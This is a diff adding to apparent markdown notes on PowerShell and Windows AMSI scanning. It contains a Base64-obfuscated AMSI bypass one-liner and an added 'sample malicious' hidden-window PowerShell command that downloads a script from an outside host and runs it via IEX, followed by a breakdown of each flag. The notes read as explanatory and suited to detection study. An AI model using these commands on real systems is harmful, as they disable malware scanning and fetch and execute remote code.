@@ -84,3 +84,17 @@ When a user executes a script or initiates PowerShell, the AMSI.dll is injected 
 - Base64 Encode
         
         [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
+        
+        
+A Sample Malicious PowerShell Process - To launch and Download a Remote File
+          
+        powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('https://js.choosebudget.com:443/sc\u0441'))\
+        
+- powershell.exe: specifies a standard ps command 
+- nop (noprofiel): starts powershell without loading any PowerShell Profiles.
+- w hidden (-WindowStyle): hide the session window from user. valid values are Normal, Min, Max and Hidden
+- c (-Command): which is followed by the command to run.
+- IEX (Invoke-Expression): runs a specified string as cmd and returns the results fo the expression or cmd
+- New-Object: -cmdlet creates an instance of a .NET framework or COM object
+- Net.webclient: Provides common methods for sending & receiving data from a resource indentified by a URI
+- e (encode) parameter indicates that what follows is base64 encoded
